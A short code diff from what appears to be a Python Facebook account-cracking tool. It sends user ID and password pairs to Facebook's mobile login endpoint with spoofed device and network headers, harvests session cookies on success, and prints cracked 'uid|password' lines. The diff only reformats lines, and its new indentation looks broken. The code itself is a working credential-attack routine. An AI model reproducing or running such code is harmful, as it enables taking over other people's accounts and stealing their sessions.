@@ -315,7 +315,8 @@ def gxds_files(uid,pwx):
              headers = {'User-Agent': gxdsUArndm(),
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'Host': 'graph.facebook.com',
-                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),                    'X-FB-Connection-Type': 'MOBILE.LTE',
+                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-Connection-Type': 'MOBILE.LTE',
                     'X-Tigon-Is-Retry': 'False',
                     'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                     'x-fb-device-group': '5120',
@@ -325,8 +326,8 @@ def gxds_files(uid,pwx):
                     'X-FB-Client-IP': 'True',
                     'X-FB-Server-Cluster': 'True',
                     'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
-            q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
-            if "session_key" in q:
+             q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+             if "session_key" in q:
                     gxdsCKIE = ";".join(i["name"]+"="+i["value"] for i in
                     q["session_cookies"]);gxdsCK = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={gxdsCK};{gxdsCKIE}"
                     print(f"\r\r{grn}  [GXDS-OK] {uid}|{ps}")
